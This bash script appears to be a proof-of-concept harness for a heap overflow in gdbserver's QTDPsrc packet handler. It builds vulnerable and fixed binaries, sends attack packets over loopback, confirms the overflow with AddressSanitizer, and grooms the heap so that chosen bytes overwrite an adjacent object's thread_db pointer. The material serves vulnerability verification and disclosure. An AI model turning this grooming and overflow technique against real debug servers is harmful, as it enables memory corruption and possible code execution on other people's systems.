#!/bin/bash
# CVE-2026-121997 — loopback wire-fed RSP dispatcher harness.
# Every run re-extracts the verbatim pinned cmd_qtdpsrc() and
# handle_tracepoint_general_set() slices plus verbatim ishex/unpack_varlen_hex
# from the saved pinned source and SHA-256-asserts all inputs. Transport,
# framing, stubs and the hex2bin decoder are harness code, not GDB source.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      qtdpsrc_fn.inc dispatch_fn.inc rsp_helpers.inc ppriv_fn.inc \
      a-vuln a-vuln-clang a-fixed p-vuln p-fixed
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
  if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
  if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

[ "$(srcsha ../src/tracepoint-633ae02.cc)" = \
  942306a5b1f96693a64d18819973e7e306faa1481f373615487a5fd2b4df4e2e ] \
  && ok "pin-head-tracepoint-sha256" || no "pin-head-tracepoint-sha256"
[ "$(srcsha ../src/tracepoint-fixed.cc)" = \
  c3aa8ac26253ff3fa79d6dd9caa13ae09c5c6471cf3499b22fa5b0926af95f17 ] \
  && ok "fixed-snapshot-sha256" || no "fixed-snapshot-sha256"
[ "$(srcsha ../src/rsp-low-633ae02.cc)" = \
  641d72c6c756fbc528adaa837c05d987656a4bea9df630d15a46823050ca6692 ] \
  && ok "pin-head-rsp-low-sha256" || no "pin-head-rsp-low-sha256"
[ "$(srcsha ../src/linux-low-633ae02.h)" = \
  4fe6cc996097cd4e3d30ecaafcfbb70a7d4f65914c3d02edfb193e3e48de2dcb ] \
  && ok "pin-head-linux-low-sha256" || no "pin-head-linux-low-sha256"
[ "$(srcsha wire_driver.c)" = \
  19a04d63ce458678d9ebe638cf803f30c2e144232d20fe5f2dd11ac671532b30 ] \
  && ok "wire-driver-sha256" || no "wire-driver-sha256"

extract_one() { # file, function-name regexp: include the exact return-type line
  awk -v re="$2" '{ if ($0 ~ re) { print prev; f = 1 } if (f) print;
                    if (f && $0 ~ /^}/) exit; prev = $0 }' "$1"
}
extract_fn() { extract_one "$1" '^cmd_qtdpsrc \\(char \\*own_buf\\)'; }
extract_dispatch() {
  extract_one "$1" '^handle_tracepoint_general_set \\(char \\*packet\\)';
}

extract_fn ../src/tracepoint-633ae02.cc > qtdpsrc_fn.inc
extract_dispatch ../src/tracepoint-633ae02.cc > dispatch_fn.inc
{ extract_one ../src/rsp-low-633ae02.cc '^ishex \\(int ch, int \\*val\\)';
  extract_one ../src/rsp-low-633ae02.cc '^unpack_varlen_hex \\(const char \\*buff'; } \
  > rsp_helpers.inc
awk '/^struct process_info_private$/{f=1} f{print} f&&/^};/{exit}' \
  ../src/linux-low-633ae02.h > ppriv_fn.inc
printf 'SLICE_VULN_SHA256=%s\nSLICE_DISPATCH_SHA256=%s\nSLICE_RSP_SHA256=%s\n' \
  "$(srcsha qtdpsrc_fn.inc)" "$(srcsha dispatch_fn.inc)" \
  "$(srcsha rsp_helpers.inc)"

[ "$(srcsha qtdpsrc_fn.inc)" = \
  99780c047e65cb687800e27b50525e8dd6202bfefecca13f954fae8b1aca6145 ] \
  && ok "verbatim-vulnerable-slice-sha256" || no "verbatim-vulnerable-slice-sha256"
[ "$(srcsha dispatch_fn.inc)" = \
  bd86f8a40b0ac06286d6bbddf6c8fb88385c75d4f23642bcd6738c153f82f02b ] \
  && ok "verbatim-dispatcher-slice-sha256" || no "verbatim-dispatcher-slice-sha256"
[ "$(srcsha rsp_helpers.inc)" = \
  b0bcd1a7a1bb77939a92547b01d78dc88e9a4d4a902af3ac63aebb2244a6e5d0 ] \
  && ok "verbatim-rsp-helpers-sha256" || no "verbatim-rsp-helpers-sha256"
[ "$(srcsha ppriv_fn.inc)" = \
  5e9aa981020061f85eb9b48eecd991ca46bc0487f424de37ee8ff5f4f0667d46 ] \
  && ok "verbatim-process-private-slice-sha256" \
  || no "verbatim-process-private-slice-sha256"
has ppriv_fn.inc 'struct thread_db *thread_db;' \
  "process-private-has-thread-db-pointer"
has dispatch_fn.inc 'startswith (packet, "QTDPsrc:")' \
  "dispatcher-has-qtdpsrc-branch"
has dispatch_fn.inc 'cmd_qtdpsrc (packet);' \
  "dispatcher-calls-pinned-handler"
has qtdpsrc_fn.inc 'xmalloc (slen + 1)' \
  "vulnerable-slice-has-uncapped-allocation"

GCCXX=g++
CLANGXX=clang++
command -v "$GCCXX" >/dev/null 2>&1 && ok "gxx-available" || no "gxx-available"
command -v "$CLANGXX" >/dev/null 2>&1 && ok "clangxx-available" || no "clangxx-available"

CFLAGS="-g -O0 -fno-omit-frame-pointer -std=c++17 -w"
build() { "$1" $CFLAGS $2 wire_driver.c -o "$3" 2>"$E/build-$3.log"; }

build "$GCCXX" -fsanitize=address a-vuln && ok "build-vuln-gxx-asan" \
  || no "build-vuln-gxx-asan"
# Fixed snapshot: swap the included slice only, leaving every other byte.
cp qtdpsrc_fn.inc qtdpsrc_vuln.inc
extract_fn ../src/tracepoint-fixed.cc > qtdpsrc_fn.inc
[ "$(srcsha qtdpsrc_fn.inc)" = \
  ec699708715aad2ac60a6316f2fc5beb128544280c6d6e50847ab451f3294f87 ] \
  && ok "verbatim-fixed-slice-sha256" || no "verbatim-fixed-slice-sha256"
has qtdpsrc_fn.inc 'slen != len / 2' "fixed-slice-has-length-check"
build "$GCCXX" -fsanitize=address a-fixed && ok "build-fixed-gxx-asan" \
  || no "build-fixed-gxx-asan"
cp qtdpsrc_vuln.inc qtdpsrc_fn.inc
build "$GCCXX" "" p-vuln && ok "build-vuln-plain" || no "build-vuln-plain"
extract_fn ../src/tracepoint-fixed.cc > qtdpsrc_fn.inc
build "$GCCXX" "" p-fixed && ok "build-fixed-plain" || no "build-fixed-plain"
cp qtdpsrc_vuln.inc qtdpsrc_fn.inc

# --- rung 3 over the real dispatch path, attacker bytes fed over loopback ---
for n in 32 64; do
  f="$E/asan-attack-$n.out"
  ./a-vuln attack "$n" 0 >"$f" 2>&1
  has "$f" "WIRE_MATCH=1" "wire-attack-$n-checksum"
  has "$f" "DISPATCH_ENTER=1" "wire-attack-$n-dispatched"
  has "$f" "AddressSanitizer: heap-buffer-overflow" "wire-attack-$n-asan"
  has "$f" "WRITE of size 1" "wire-attack-$n-asan-write"
  has "$f" "0 bytes after 2-byte region" "wire-attack-$n-asan-region"
  has "$f" "cmd_qtdpsrc" "wire-attack-$n-asan-handler-frame"
  has "$f" "handle_tracepoint_general_set" "wire-attack-$n-asan-dispatch-frame"
done

if command -v "$CLANGXX" >/dev/null 2>&1; then
  build "$CLANGXX" -fsanitize=address a-vuln-clang \
    && ok "build-vuln-clang-asan" || no "build-vuln-clang-asan"
  f="$E/asan-attack-clang-64.out"
  ./a-vuln-clang attack 64 0 >"$f" 2>&1
  has "$f" "AddressSanitizer: heap-buffer-overflow" "wire-attack-clang-asan"
  has "$f" "handle_tracepoint_general_set" "wire-attack-clang-dispatch-frame"
fi

# --- fixed snapshot and well-formed packet controls over the same wire -----
f="$E/fixed-asan-attack.out"
./a-fixed attack 64 0 >"$f" 2>&1
has "$f" "DISPATCH=1 REPLY_FROM_HANDLER=E01" "fixed-wire-rejects-attack"
has "$f" "CLIENT_REPLY=\$E01#" "fixed-wire-client-sees-E01"
hasnt "$f" "AddressSanitizer" "fixed-wire-no-asan"

for bin in a-vuln a-fixed; do
  f="$E/$bin-safe.out"
  ./$bin safe 16 0 >"$f" 2>&1
  has "$f" "DISPATCH=1 REPLY_FROM_HANDLER=OK" "$bin-wire-safe-ok"
  has "$f" "CLIENT_REPLY=\$OK#" "$bin-wire-client-sees-OK"
  hasnt "$f" "AddressSanitizer" "$bin-wire-safe-no-asan"
done

# --- stock glibc: chosen bytes hit a live adjacent object (groomed layout) --
f="$E/plain-groom-attack-64.out"
PLAIN_MODE=1 ./p-vuln attack 64 1 >"$f" 2>&1
has "$f" "DELTA=32" "plain-victim-next-chunk"
has "$f" "SIZE_HIT=1" "plain-victim-chunk-size-chosen"
has "$f" "ADJACENT_CORRUPTED=1" "plain-victim-object-overwritten"
has "$f" "DISPATCH=1 REPLY_FROM_HANDLER=OK" "plain-attack-dispatched"
has "$f" "CLIENT_REPLY=\$OK#" "plain-attack-client-see-OK"

# Advisory's claimed field placement: a real-layout process_info_private
# sliced verbatim from the pinned header, groomed adjacent, no call through
# the overwritten thread_db pointer (no real gdbserver process here).
f="$E/plain-priv-attack-64.out"
PLAIN_MODE=1 ./p-vuln attack 64 2 >"$f" 2>&1
has "$f" "DELTA=32" "priv-victim-next-chunk"
has "$f" "THREADDB_HIT=1" "priv-threaddb-chosen-bytes"
has "$f" "ADJACENT_CORRUPTED=1" "priv-object-overwritten"
has "$f" "DISPATCH=1 REPLY_FROM_HANDLER=OK" "priv-attack-dispatched"
f="$E/plain-priv-safe-16.out"
PLAIN_MODE=1 ./p-vuln safe 16 2 >"$f" 2>&1
has "$f" "ADJACENT_CORRUPTED=0" "priv-safe-intact"
f="$E/plain-priv-fixed-64.out"
PLAIN_MODE=1 ./p-fixed attack 64 2 >"$f" 2>&1
has "$f" "ADJACENT_CORRUPTED=0" "priv-fixed-intact"

# Attacker-chosen decoded length decides which live fields are reached.
for n in 8 32 48; do
  f="$E/plain-groom-attack-$n.out"
  PLAIN_MODE=1 ./p-vuln attack "$n" 1 >"$f" 2>&1
  has "$f" "DELTA=32" "plain-$n-adjacent-object"
  if [ "$n" -eq 8 ]; then
    has "$f" "SIZE_HIT=0" "plain-8-victim-size-intact"
    has "$f" "ADJACENT_CORRUPTED=0" "plain-8-victim-fields-intact"
  else
    has "$f" "SIZE_HIT=1" "plain-$n-victim-size-chosen"
    has "$f" "ADJACENT_CORRUPTED=1" "plain-$n-victim-fields-overwritten"
  fi
done

f="$E/plain-groom-safe-16.out"
PLAIN_MODE=1 ./p-vuln safe 16 1 >"$f" 2>&1
has "$f" "ADJACENT_CORRUPTED=0" "plain-safe-victim-intact"

f="$E/plain-fixed-attack-64.out"
PLAIN_MODE=1 ./p-fixed attack 64 1 >"$f" 2>&1
has "$f" "ADJACENT_CORRUPTED=0" "plain-fixed-victim-intact"
has "$f" "DISPATCH=1 REPLY_FROM_HANDLER=E01" "plain-fixed-rejects-attack"

# --- path-independent normalized content hash ------------------------------
cat "$E"/*.out 2>/dev/null \
  | grep -E '^(MODE=|WIRE_|DISPATCH=|CLIENT_|LAYOUT |PRIV |SLICE_|RC=|SUMMARY=|ERROR: AddressSanitizer:|WRITE of size|SUMMARY: AddressSanitizer:|    #[0-9]+ .*cmd_qtdpsrc|    #[0-9]+ .*handle_tracepoint_general_set|    #[0-9]+ .*hex2bin)' \
  | sed -E -e 's/0x[0-9a-f]{6,}/0xADDR/g' \
           -e 's#/[^ ]*/(wire_driver\.c|qtdpsrc_fn\.inc|dispatch_fn\.inc)#PATH/\1#g' \
           -e 's/LOOPBACK_PORT=[0-9]+/LOOPBACK_PORT=PORT/g' \
  > "$E/normalized.txt"
HASH=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'NORMALIZED_HASH=%s\n' "$HASH"
printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
